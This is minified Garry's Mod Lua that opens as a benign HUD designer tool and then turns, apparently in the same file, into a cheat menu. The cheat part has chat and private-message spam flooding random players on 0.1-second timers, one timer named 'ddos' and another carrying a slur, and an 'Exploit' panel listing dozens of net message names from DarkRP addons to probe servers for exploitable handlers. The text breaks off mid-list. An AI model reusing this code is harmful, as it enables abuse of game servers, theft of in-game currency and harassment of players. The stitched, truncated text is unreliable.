HD.EditShape(aY,c6,c7)if aY==nil then return end;c7=string.lower(c7)local c8=HD.GetShapeLayer(aY)or HD.CurLayer;local bb=HD.GetShapeType(aY)or HD.CurType;HD.DrawnObjects[c8]=HD.DrawnObjects[c8]or{}HD.DrawnObjects[c8][bb]=HD.DrawnObjects[c8][bb]or{}local c9=HD.DrawnObjects[c8][bb][aY]if c9==nil then return end;local ay,aA;width,height,text,font,color,layer,newlayer,corner,format,texture,texturestring=nil;local ca,cb=nil;ay,aA=c6.x or c9.x,c6.y or c9.y;layer,newlayer=c6.layer or c8,c6.newlayer or c8;color=c6.color or c9.color;if bb=="draw.DrawText"then text,font=c6.text or c9.text,c6.font or c9.font;width,height=HD.GetTextSize(text,font)format=c6.format or c9.format else width,height=c6.width or c9.width,c6.height or c9.height end;if bb=="draw.RoundedBox"then corner=c6.corner or c9.corner elseif bb=="surface.DrawTexturedRect"then texture=c6.texture or c9.texture,c6.texturestring or c9.texturestring end;if c7=="size"then if bb=="draw.DrawText"then return end;width,height=math.SnapTo(width,HD.GridSize),math.SnapTo(height,HD.GridSize)width,height=math.Clamp(width,HD.GridSize,ScrW()),math.Clamp(height,HD.GridSize,ScrH())HD.DrawnObjects[layer][bb][aY].width=width;HD.DrawnObjects[layer][bb][aY].height=height;HD.SetBoundaries(aY,ay,aA,width,height,layer)elseif c7=="move"then local cc,cd=HD.Canvas:GetSize()ay,aA=math.Clamp(ay,0,cc-width),math.Clamp(aA,0,cd-height)HD.DrawnObjects[layer][bb][aY].x=ay;HD.DrawnObjects[layer][bb][aY].y=aA;HD.SetBoundaries(aY,ay,aA,width,height,layer)elseif c7=="layer"then local ce=layer;local bK=newlayer;HD.DrawnObjects[bK]=HD.DrawnObjects[bK]or{}HD.DrawnObjects[bK][bb]=HD.DrawnObjects[bK][bb]or{}local d=1;for d=1,HD.Layers do for bb,aX in pairs(HD.DrawnObjects[d])do if aX[aY]then aX[aY]=nil end end end;HD.DrawnObjects[ce][bb][aY]=nil;if bb=="draw.RoundedBox"then HD.DrawnObjects[bK][bb][aY]={x=ay,y=aA,width=width,height=height,color=color,corner=corner}elseif bb=="draw.DrawText"then HD.DrawnObjects[bK][bb][aY]={x=ay,y=aA,text=text,font=font,color=color,format=format}elseif bb=="surface.DrawTexturedRect"then HD.DrawnObjects[bK][bb][aY]={x=ay,y=aA,width=width,height=height,color=color,texture=texture,texturestring=texturestring}else print("Attempt to layer unknown object")return end;HD.SetBoundaries(aY,ay,aA,width,height,bK)return elseif c7=="corner"then if bb=="draw.DrawText"then return end;HD.DrawnObjects[c8][bb][aY].corner=corner;HD.SetBoundaries(aY,ay,aA,width,height,layer)end end;function HD.CloseOpenInfoPanels()if HD.GridOpen then HD.GridEditor:SetVisible(false)HD.GridOpen=false;HD.GridEditor=nil end;if HD.ColMixerOpen then HD.ColMixer:SetVisible(false)HD.ColMixerOpen=false;HD.ColMixer=nil end;if HD.LayerOpen then HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil end;if HD.ExportOpen then HD.Exporter:SetVisible(false)HD.ExportOpen=false;HD.Exporter=nil end;if HD.LoadOpen then HD.LoadSel:SetVisible(false)HD.LoadOpen=false;HD.LoadSel=nil end;if HD.CreateOpen then HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil end;HD.SetTool()end;function HD.GetMousePos()local cf=1;local cg=38;local b7=HD.Canvas:ScreenToLocal(gui.MouseX())-cf;local b8=HD.Canvas:ScreenToLocal(gui.MouseY())-cg;return b7,b8 end;function HD.GetTool()return HD.CurTool,HD.SelectedButton end;function HD.GetTextSize(text,font)surface.SetFont(font)local width,height=surface.GetTextSize(text)return width,height end;function HD.GetShapeData(aY)if aY==nil then return end;local bb=HD.GetShapeType(aY)local layer=HD.GetShapeLayer(aY)local ch={}for aP,m in pairs(HD.DrawnObjects[layer][bb][aY])do ch[aP]=m end;return ch end;function HD.GetShapeLayer(aY)if aY==nil then return end;local d=1;for d=1,HD.Layers do local bb=HD.GetShapeType(aY)or HD.CurType;if HD.DrawnObjects[d][bb]~=nil then if HD.DrawnObjects[d][bb][aY]then return d end end end end;function HD.GetShapeType(aY)local d=1;for d=1,HD.Layers do for aP,m in pairs(HD.Types)do if HD.DrawnObjects[d][m]~=nil then if HD.DrawnObjects[d][m][aY]then return m end end end end end;function HD.SetTool(bp,K)HD.CurTool=bp;HD.SelectedButton=K end;function HD.SetType(K)for aP,m in pairs(HD.Types)do if string.lower(m)==string.lower(K)then HD.CurType=HD.Types[aP]return true end end end;function HD.SetBoundaries(aY,ay,aA,width,height,layer)layer=layer or HD.CurLayer;HD.Boundaries[aY]={x=ay,y=aA,farx=ay+width,fary=aA+height,layer=layer}end;function HD.InfoPanelOpen()if HD.GridOpen or HD.ColMixerOpen or HD.LayerOpen or HD.ExportOpen or HD.CreateOpen or HD.LoadOpen then return true end;return false end;function HD.CancelAlter()HD.CurMovingData={}HD.Moving=false;HD.CurSizeID=nil;HD.Sizing=false end;function HD.IsInCanvas(ay,aA)ay,aA=tonumber(ay),tonumber(aA)local cc,cd=HD.Canvas:GetSize()local ci,cj=0,HD.GridSize;if HD.InfoPanelOpen()then return false end;if ay>ci and ay<cc then if aA>cj and aA<cd then return true end end;return false end;function HD.IsInSize(aY,ay,aA)ay,aA=tonumber(ay),tonumber(aA)if HD.GetShapeType(aY)=="draw.DrawText"then return end;local b0=20;local R=HD.Boundaries[aY]if R then local b1,b2=R.farx,R.fary;local b3,b4=b1-b0,b2-b0;if HD.InfoPanelOpen()then return false end;if ay>b3 and ay<b1 then if aA>b4 and aA<b2 then return true end end end;return false end;function HD.IsInShape(ay,aA)ay,aA=tonumber(ay),tonumber(aA)local bf,bg,aY;for ck,c6 in pairs(HD.Boundaries)do if ay>c6.x and ay<c6.farx then if aA>c6.y and aA<c6.fary then if c6.layer==HD.CurLayer then bf,bg=ay-c6.x,aA-c6.y;aY=ck;return true,aY,bf,bg end end end end;return false end;function math.SnapTo(bp,cl)if HD.GridEnabled~=true then return bp end;bp=math.Round(bp)local cm={min=0,max=0}for d=1,cl do if math.IsDivisible(bp+d,cl)then cm.max=bp+d end;if math.IsDivisible(bp-d,cl)then cm.min=bp-d end end;if cm.max-bp<=bp-cm.min then return cm.max else return cm.min end end;function math.IsDivisible(cn,co)return cn%co==0 end;function HD.Load(cp)HD.CancelAlter()local cq=file.Read("g/"..cp,"DATA")local c6=util.JSONToTable(cq)HD.ProjectName=c6.ProjectName or HD.ProjectName;HD.ProjectText:SetText(HD.ProjectName)local d=1;local a0=table.Count(c6)if a0>1 then a0=a0-1 end;for d=1,a0 do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}for bb,aX in pairs(c6[d])do HD.DrawnObjects[d][bb]=HD.DrawnObjects[d][bb]or{}for aY,aZ in pairs(aX)do HD.DrawnObjects[d][bb][HD.ShapeID]={}table.Merge(HD.DrawnObjects[d][bb][HD.ShapeID],aZ)local a_=HD.DrawnObjects[d][bb][HD.ShapeID].color or HD.DefaultCol;HD.DrawnObjects[d][bb][HD.ShapeID].color=Color(a_.r,a_.g,a_.b,a_.a)if bb=="surface.DrawTexturedRect"then local cr=HD.FAKE_TEXTURE;local cs=HD.DrawnObjects[d][bb][HD.ShapeID].texturestring or cr;local bp=surface.GetTextureID(cs)HD.DrawnObjects[d][bb][HD.ShapeID].texture=bp;HD.DrawnObjects[d][bb][HD.ShapeID].texturestring=cs end;local width,height=nil;if bb=="draw.DrawText"then width,height=HD.GetTextSize(aZ.text,aZ.font)else width,height=aZ.width,aZ.height end;HD.SetBoundaries(HD.ShapeID,aZ.x,aZ.y,width,height,d)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end end end end;function HD.Save(K)if HD.ShapeCount<2 then print("Not enough shapes ("..HD.ShapeCount..") to save!")return end;print("Saving current project..")local ct=table.Copy(HD.DrawnObjects)local d=1;for d=1,HD.Layers do for bb,aX in pairs(ct[d])do for aY,aZ in pairs(aX)do local a_=aZ.color or HD.DefaultCol;aZ.color={r=a_.r,g=a_.g,b=a_.b,a=a_.a}end end end;ct.ProjectName=ct.ProjectName or HD.ProjectName;local cq=util.TableToJSON(ct)if cq~="[]"then local cu,cv,cw=nil;cu={"/","\\","?","|","<",">",'"',":"}cv=K or HD.ProjectName;for aP,m in pairs(cu)do cv=string.gsub(cv,m,"-")end;cv=string.gsub(cv," ","")cw=os.date("%H%M%S")cw=string.gsub(cw,":","")cw=string.lower("save_"..cv.."_"..cw)file.CreateDir("g")file.Write("g/"..cw..".txt",cq)end;timer.Simple(0.5,function()HD.SetTool(HD.Tools.Select,"Select")end)end;function HD.Autosave()print("Autosaving current project..")local cq=util.TableToJSON(HD.DrawnObjects)if cq~="[]"then local cu={"/","\\","?","|","<",">",'"',":"}local cv=HD.ProjectName;for aP,m in pairs(cu)do cv=string.gsub(cv,m,"-")end;cv=string.gsub(cv," ","")local cw=os.date("%H%M%S")cw=string.gsub(cw,":","")cw=string.lower("autosave_"..cv.."_"..cw)file.CreateDir("g/autosaves/")file.Write("g/autosaves/"..cw..".txt",cq)end end;function HD.CreateExportCode()HD.CancelAlter()local cx={}local d=1;for d=1,HD.Layers do cx[d]={}for bb,aX in pairs(HD.DrawnObjects[d])do if bb=="draw.RoundedBox"then local G=1;for G=1,HD.ShapeCount do local c6=HD.DrawnObjects[d][bb][G]if c6~=nil then local ay,aA,width,height,a_,corner=c6.x,c6.y,c6.width,c6.height,c6.color,c6.corner;local cy,cz,cA,cB=nil;if HD.ScaleSize then cA,cB=math.Round(ScrW()/width,2),math.Round(ScrH()/height,2)if cA==math.huge then width=0 else width="ScrW()/"..cA..""end;if cB==math.huge then height=0 else height="ScrH()/"..cB..""end end;aA=aA+HD.Y_BUFFER;if HD.ScalePos then cy,cz=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cy==math.huge then ay=0 else ay="ScrW()/"..cy end;if cz==math.huge then aA=0 elseif cz==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cz end else if ay>ScrW()/2 then cy=ScrW()-ay;ay="ScrW()-"..cy end;if aA>ScrH()/2 then cz=ScrH()-aA;aA="ScrH()-"..cz end end;a_="Color("..a_.r..", "..a_.g..", "..a_.b..", "..a_.a..")"cx[d][G]=string.format("draw.RoundedBox(%i, %s, %s, %s, %s, "..a_..")",corner,ay,aA,width,height)end end elseif bb=="draw.DrawText"then local G=1;for G=1,HD.ShapeCount do local c6=HD.DrawnObjects[d][bb][G]if c6~=nil then local ay,aA,width,height,a_,corner=c6.x,c6.y,c6.width,c6.height,c6.color,c6.corner;local ay,aA,text,font,a_,format=c6.x,c6.y,c6.text,c6.font,c6.color,c6.format;aA=aA+HD.Y_BUFFER;local cy,cz=nil;if HD.ScalePos then cy,cz=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cy==math.huge then ay=0 else ay="ScrW()/"..cy end;if cz==math.huge then aA=0 elseif cz==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cz end end;if format~=nil then local c6,cC=nil;for aP,m in pairs(HD.FormatTypes)do if m.code==format then c6=aP end end;c6=HD.FormatTypes[c6]cC=c6.code;text=cC else text='"'..text..'"'end;a_="Color("..a_.r..", "..a_.g..", "..a_.b..", "..a_.a..")"cx[d][G]=string.format('draw.DrawText(%s, "%s", %s, %s, '..a_..')',text,font,ay,aA,a_)end end elseif bb=="surface.DrawTexturedRect"then local G=1;for G=1,HD.ShapeCount do local c6=HD.DrawnObjects[d][bb][G]if c6~=nil then local ay,aA,width,height,a_,texture,texturestring=c6.x,c6.y,c6.width,c6.height,c6.color,c6.texture,c6.texturestring;texturestring=texturestring or"INVALID_TEXTURE"local cy,cz,cA,cB=nil;if HD.ScaleSize then cA,cB=math.Round(ScrW()/width,2),math.Round(ScrH()/height,2)if cA==math.huge then width=0 else width="ScrW()/"..cA..""end;if cB==math.huge then height=0 else height="ScrH()/"..cB..""end end;aA=aA+HD.Y_BUFFER;if HD.ScalePos then cy,cz=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cy==math.huge then ay=0 else ay="ScrW()/"..cy end;if cz==math.huge then aA=0 elseif cz==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cz end else if ay>ScrW()/2 then cy=ScrW()-ay;ay="ScrW()-"..cy end;if aA>ScrH()/2 then cz=ScrH()-aA;aA="ScrH()-"..cz end end;a_="Color("..a_.r..", "..a_.g..", "..a_.b..", "..a_.a..")"local draw=string.format("surface.DrawTexturedRect(%s, %s, %s, %s, "..a_..")",ay,aA,width,height)cx[d][G]=[[
local Texture]]..G..[[ = Material("]]..texturestring..[[") 
surface.SetMaterial(Texture]]..G..[[)
surface.SetDrawColor(]]..a_..[[)
]]..draw end end else end end end;return cx or{}end;function HD.FontCreator()local cD=vgui.Create("DFrame")cD:SetSize(ScrW(),ScrH())cD:SetPos(0,0)cD:SetTitle("")cD:SetDraggable(false)cD.btnMaxim:SetVisible(false)cD.btnMinim:SetVisible(false)cD.btnClose:SetVisible(false)cD.Paint=function()draw.RoundedBox(0,0,0,cD:GetWide(),cD:GetTall(),Color(0,0,0,0))end;local cE=vgui.Create("DFrame",cD)cE:SetSize(500,400)cE:SetPos(ScrW()/2-cE:GetWide()/2,ScrH()/2-cE:GetTall()/2)cE:SetTitle("")cE:MakePopup()cE:SetDraggable(true)cE.btnMaxim:SetVisible(false)cE.btnMinim:SetVisible(false)cE.btnClose:SetVisible(true)cE.Paint=function()draw.RoundedBox(0,0,0,cE:GetWide(),cE:GetTall(),Color(39,174,96))end;local bN=vgui.Create("DButton",cE)bN:SetText("Exit")bN:SetTextColor(Color(255,255,255,255))bN:SetFont("HD_Title")bN:SetSize(80,30)bN:SetPos(cE:GetWide()-bN:GetWide()-10,10)bN.Paint=function()draw.RoundedBox(0,0,0,bN:GetWide(),bN:GetTall(),Color(200,79,79,255))end;bN.DoClick=function()cD:Close()cE:Close()end end;HD.OpenDesigner()end;local cF=vgui.Create("DFrame")cF:SetSize(670,400)cF:Center()cF:SetTitle("")cF:MakePopup()cF:SetSizable(true)cF:ShowCloseButton(false)cF.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.RoundedBox(0,0,0,ad,22,b.titlebar)draw.SimpleText("Logs","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;cF.PerformLayout=function(self,G,S)b.lst:SetSize(G-6,25)if IsValid(b.ll)then b.ll:SetSize(G-6,S-83)end end;b.lst=vgui.Create("DTextEntry",cF)b.lst:SetPos(3,53)b.lst:SetSize(594,25)b.lst:SetText("")b.lst.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;b.lst.OnTextChanged=function()if IsValid(b.ll)and b.logtype then b.findlog(b.lst:GetValue(),b.logtype)end end;local cG=3;local function cH(cI,K,A)a2(K,cG,25,cI,25,cF,A)cG=cG+cI+2 end;function b.findlog(cJ,type)if not IsInGame()then return end;if IsValid(b.ll)then b.ll:Remove()end;b.ll=vgui.Create("DScrollPanel",cF)b.ll:SetPos(3,80)b.ll:SetSize(600-6,267)b.ll.Paint=function(h,ad,ae)end;b.ll.VBar.Paint=function(cK,ad,ae)draw.RoundedBox(0,0,0,ad,ae,Color(0,0,0,50))end;b.ll.VBar.btnUp.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;b.ll.VBar.btnDown.Paint=function(cK,ad,ae)draw.RoundedBox(0,2,2,ad-4,ae-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;local function cL(cM)local cN=vgui.Create("DButton",b.ll)cN:Dock(TOP)cN:DockMargin(4,0,0,0)cN:SetText("")cN:SetColor(b.colortext)cN.DoClick=function()SetClipboardText(cM)end;cN.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)if cN.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end;draw.SimpleText(cM,"hack_font_20",1,1,b.colortext)end end;local cO=util.JSONToTable(file.Read(b.logs,"DATA"))for h,ae in pairs(string.Explode("HLS",cO[type][1]))do if ae==""then return end;if string.find(ae,cJ:Replace("[",""):Replace("]",""))then cL(ae)end end end;cH(32,"Kill",function()b.logtype="kill"b.findlog('',b.logtype)end)cH(64,"Damage",function()b.logtype="damage"b.findlog('',b.logtype)end)cH(66,"Connect",function()b.logtype="connect"b.findlog('',b.logtype)end)cH(87,"Disconnect",function()b.logtype="disconnect"b.findlog('',b.logtype)end)cH(105,"Change Name",function()b.logtype="namechange"b.findlog('',b.logtype)end)cH(37,"Chat",function()b.logtype="chat"b.findlog('',b.logtype)end)cF:Hide()a1.chat={"exechack.cc"}local cP=vgui.Create("DFrame")cP:SetSize(500,293)cP:Center()cP:SetDraggable(true)cP:MakePopup()cP:ShowCloseButton(false)cP:SetTitle("")cP.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.RoundedBox(0,0,0,ad,22,b.titlebar)draw.SimpleText("Spam","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;local cG=3;local function cH(cI,K,A)local cQ=vgui.Create("DButton",cP)cQ:SetFont("hack_font_18")cQ:SetText(K)cQ:SetTextColor(b.colortext)cQ:SetSize(cI,25)cQ:SetPos(cG,25)cQ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cQ.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cQ.DoClick=A;cG=cG+cI+2 end;cH(41,"Chat",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",cP)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function cR()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,30)menumessage:SetSize(322,205)menumessage.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local cS=3;for d=1,#a1.chat do local cQ=vgui.Create("DButton",menumessage)cQ:SetFont("hack_font_18")cQ:SetText(a1.chat[d])cQ:SetTextColor(b.colortext)cQ:SetSize(select(1,surface.GetTextSize(a1.chat[d]))+20,25)cQ:SetPos(3,cS)cQ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cQ.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cQ.DoClick=function()table.remove(a1.chat,d)cR()end;cS=cS+27 end end;local cT=vgui.Create("DTextEntry",panelcspam)cT:SetPos(3,3)cT:SetSize(280,25)cT:SetText("text")cT.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;local cQ=vgui.Create("DButton",panelcspam)cQ:SetFont("hack_font_18")cQ:SetText("Add")cQ:SetTextColor(b.colortext)cQ:SetSize(40,25)cQ:SetPos(285,3)cQ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cQ.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cQ.DoClick=function()local cU=true;for h,m in pairs(a1.chat)do if a1.chat[h]==cT:GetText()then cU=false end end;if cU then a1.chat[#a1.chat+1]=cT:GetText()end;cR()end;local cV=panelcspam:Add("DCheckBoxLabel")cV:SetPos(327,2)cV:SetText("Enabled")cV:SetFont("hack_font_18")cV:SetTextColor(b.colortext)if a1["chatspam"]then cV:SetValue(true)else cV:SetValue(false)end;function cV:OnChange(aS)if aS then a1["chatspam"]=true else a1["chatspam"]=false end end;function cV.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;local cV=panelcspam:Add("DCheckBoxLabel")cV:SetPos(327,19)cV:SetText("OOC")cV:SetFont("hack_font_18")cV:SetTextColor(b.colortext)if a1["chatspamooc"]then cV:SetValue(true)else cV:SetValue(false)end;function cV:OnChange(aS)if aS then a1["chatspamooc"]=true else a1["chatspamooc"]=false end end;function cV.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;local cV=panelcspam:Add("DCheckBoxLabel")cV:SetPos(327,36)cV:SetText("Super OOC")cV:SetFont("hack_font_18")cV:SetTextColor(b.colortext)if a1["chatspamoocsuper"]then cV:SetValue(true)else cV:SetValue(false)end;function cV:OnChange(aS)if aS then a1["chatspamoocsuper"]=true else a1["chatspamoocsuper"]=false end end;function cV.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;local cV=panelcspam:Add("DCheckBoxLabel")cV:SetPos(327,53)cV:SetText("Pm")cV:SetFont("hack_font_18")cV:SetTextColor(b.colortext)if a1["chatpmspammer"]then cV:SetValue(true)else cV:SetValue(false)end;function cV:OnChange(aS)if aS then a1["chatpmspammer"]=true;p([[ local chat_strings=util.JSONToTable(']]..util.TableToJSON(a1.chat)..[[') timer.Create("checkforgaymazafaka",0.1,0,function() if rp then rp.RunCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) end RunConsoleCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) LocalPlayer():ConCommand("darkrp pm "..table.Random(player.GetAll()):Name().." "..chat_strings[math.random(#chat_strings)]) end) ]])else a1["chatpmspammer"]=false;p([[timer.Remove("checkforgaymazafaka")]])end end;function cV.Button:Paint(a9,aP)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,a9,aP)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,a9,aP)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aP)end;cR()end)cH(56,"Kill Say",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",cP)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function cR()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,30)menumessage:SetSize(322,205)menumessage.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local cS=3;for d=1,#t["SPAM_KILLSAY"]do local cQ=vgui.Create("DButton",menumessage)cQ:SetFont("hack_font_18")cQ:SetText(t["SPAM_KILLSAY"][d])cQ:SetTextColor(b.colortext)cQ:SetSize(select(1,surface.GetTextSize(t["SPAM_KILLSAY"][d]))+20,25)cQ:SetPos(3,cS)cQ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cQ.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cQ.DoClick=function()table.remove(t["SPAM_KILLSAY"],d)z("SPAM_KILLSAY",t["SPAM_KILLSAY"])cR()end;cS=cS+27 end end;local cT=vgui.Create("DTextEntry",panelcspam)cT:SetPos(3,3)cT:SetSize(280,25)cT:SetText("text")cT.Paint=function(self,ad,ae)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ad,ae)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;local cQ=vgui.Create("DButton",panelcspam)cQ:SetFont("hack_font_18")cQ:SetText("Add")cQ:SetTextColor(b.colortext)cQ:SetSize(40,25)cQ:SetPos(285,3)cQ.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)if cQ.Hovered then draw.RoundedBox(0,0,0,ad,ae,b.buttonhovered)end end;cQ.DoClick=function()local cU=true;for h,m in pairs(t["SPAM_KILLSAY"])do if t["SPAM_KILLSAY"][h]==cT:GetText()then cU=false end end;if cU then t["SPAM_KILLSAY"][#t["SPAM_KILLSAY"]+1]=cT:GetText()end;z("SPAM_KILLSAY",t["SPAM_KILLSAY"])cR()end;au("Enabled","SPAM_KILLSAY_ENABLED",327,2,panelcspam)au("OOC","SPAM_KILLSAY_OOC",327,19,panelcspam)cR()end)timer.Create("ddos",0.1,0,function()if a1["chatspam"]then if a1.chat=={}then return end;if not a1["chatspamooc"]then RunConsoleCommand("say",a1.chat[math.random(1,#a1.chat)])else RunConsoleCommand("say","/ooc "..a1.chat[math.random(1,#a1.chat)])end end;if a1["chatspamoocsuper"]then if a1.chat=={}then return end;RunConsoleCommand("darkrp","ooc "..a1.chat[math.random(1,#a1.chat)])end end)cP:Hide()local cW=vgui.Create("DFrame")cW:SetSize(230,300)cW:Center()cW:SetTitle("")cW:SetDraggable(true)cW:MakePopup()cW:ShowCloseButton(false)cW:SetSizable(true)cW.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)draw.RoundedBox(0,0,0,ad,22,b.titlebar)draw.SimpleText("Exploit","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;cW.PerformLayout=function(self,G,S)if IsValid(b.exploitslist)then b.exploitslist:SetSize(G-6,S-54)end end;a2("Refresh",3,24,63,25,cW,function()if IsInGame()then p([[local a={"pplay_addrow","pplay_sendtable","WriteQuery","SendMoney","BailOut","customprinter_get","textstickers_entdata","NC_GetNameChange","ATS_WARP_REMOVE_CLIENT","ATS_WARP_FROM_CLIENT","ATS_WARP_VIEWOWNER","CFRemoveGame","CFJoinGame","CFEndGame","CreateCase","rprotect_terminal_settings","StackGhost","RevivePlayer","ARMORY_RetrieveWeapon","TransferReport","SimplicityAC_aysent","pac_to_contraption","SyncPrinterButtons76561198056171650","sendtable","steamid2","Kun_SellDrug","net_PSUnBoxServer","pplay_deleterow","pplay_addrow","CraftSomething","banleaver","75_plus_win","ATMDepositMoney","Taxi_Add","Kun_SellOil","SellMinerals","TakeBetMoney","PoliceJoin","CpForm_Answers","DepositMoney","MDE_RemoveStuff_C2S","NET_SS_DoBuyTakeoff","NET_EcSetTax","RP_Accept_Fine","RP_Fine_Player","RXCAR_Shop_Store_C2S","RXCAR_SellINVCar_C2S","drugseffect_remove","drugs_money","CRAFTINGMOD_SHOP","drugs_ignite","drugseffect_hpremove","DarkRP_Kun_ForceSpawn","drugs_text","NLRKick","RecKickAFKer","GMBG:PickupItem","DL_Answering","data_check","plyWarning","NLR.ActionPlayer","timebombDefuse","start_wd_emp","kart_sell","FarmingmodSellItems","ClickerAddToPoints","bodyman_model_change","TOW_PayTheFine","FIRE_CreateFireTruck","hitcomplete","hhh_request","DaHit","TCBBuyAmmo","DataSend","gBan.BanBuffer","fp_as_doorHandler","Upgrade","TowTruck_CreateTowTruck","TOW_SubmitWarning","duelrequestguiYes","JoinOrg","pac_submit","NDES_SelectedEmblem","join_disconnect","Morpheus.StaffTracker","casinokit_chipexchange","BuyKey","BuyCrate","FactionInviteConsole","FacCreate","1942_Fuhrer_SubmitCandidacy","pogcp_report_submitReport","textscreens_download","hsend","BuilderXToggleKill","Chatbox_PlayerChat","reports.submit","services_accept","Warn_CreateWarn","NewReport","soez","GiveHealthNPC","DarkRP_SS_Gamble","buyinghealth","DarkRP_preferredjobmodel","whk_setart","WithdrewBMoney","DuelMessageReturn","ban_rdm","BuyCar","ats_send_toServer","dLogsGetCommand","disguise","gportal_rpname_change","AbilityUse","ClickerAddToPoints","race_accept","give_me_weapon","FinishContract","NLR_SPAWN","Kun_ZiptieStruggle","JB_Votekick","Letthisdudeout","ckit_roul_bet","pac.net.TouchFlexes.ClientNotify","ply_pick_shit","TFA_Attachment_RequestAll","BuyFirstTovar","BuySecondTovar","GiveHealthNPC","MONEY_SYSTEM_GetWeapons","MCon_Demote_ToServer","withdrawp","PCAdd","ActivatePC","PCDelAll","viv_hl2rp_disp_message","ATM_DepositMoney_C2S","BM2.Command.SellBitcoins","BM2.Command.Eject","tickbooksendfine","egg","RHC_jail_player","PlayerUseItem","Chess 